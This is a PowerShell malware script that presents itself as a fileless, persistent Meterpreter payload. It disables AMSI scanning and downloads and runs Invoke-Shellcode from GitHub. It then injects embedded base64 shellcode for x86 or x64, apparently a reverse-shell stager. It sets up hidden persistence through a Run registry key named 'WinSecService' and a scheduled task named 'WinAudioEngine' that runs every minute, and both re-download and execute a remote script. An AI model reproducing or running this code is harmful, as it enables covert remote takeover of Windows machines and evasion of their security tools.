# --- IMMORTAL FILELESS PERSISTENT METERPRETER PAYLOAD (x86 + x64) ---

# Bypass AMSI (obfuscated, simple)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Load Invoke-Shellcode from PowerSploit (in-memory shellcode runner)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

# Define both shellcodes
$x86 = [Convert]::FromBase64String('/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggUAHTi0gYhcl0PEkx/4s0iwHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/Vagpok7ndGWgCAPSkieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V')
$x64 = [Convert]::FromBase64String('/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAPSkk7ndGUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V')

# Detect architecture and inject correct shellcode
if ([IntPtr]::Size -eq 8) {
    Invoke-Shellcode -Shellcode $x64 -Force
} else {
    Invoke-Shellcode -Shellcode $x86 -Force
}

# Registry persistence (run on login)
$task = "powershell.exe -w hidden -nop -EncodedCommand " + `
  ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "$u='https://github.com/mitasahi/root/raw/refs/heads/main/ps-persist.ps1.tar.gz';" +
    "$p=$env:TEMP+'\psp';mkdir $p -f|Out-Null;" +
    "$f=$p+'\ps-persist.ps1.tar.gz';Invoke-WebRequest -Uri $u -OutFile $f;" +
    "tar -xf $f -C $p;" +
    "IEX(Get-Content -Raw -Path ($p+'\ps-persist.ps1'))"
  )))
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WinSecService" -Value $task -Force

# Scheduled task backup (every 1 minute)
$taskCmd = 'powershell.exe -w hidden -nop -c "$u=''https://github.com/mitasahi/root/raw/refs/heads/main/ps-persist.ps1.tar.gz'';$p=$env:TEMP+''\psp'';mkdir $p -f|Out-Null;$f=$p+''\ps-persist.ps1.tar.gz'';Invoke-WebRequest -Uri $u -OutFile $f;tar -xf $f -C $p;IEX(Get-Content -Raw -Path ($p+''\ps-persist.ps1''))"'
schtasks /create /sc minute /mo 1 /tn "WinAudioEngine" /tr "$taskCmd" /f | Out-Null
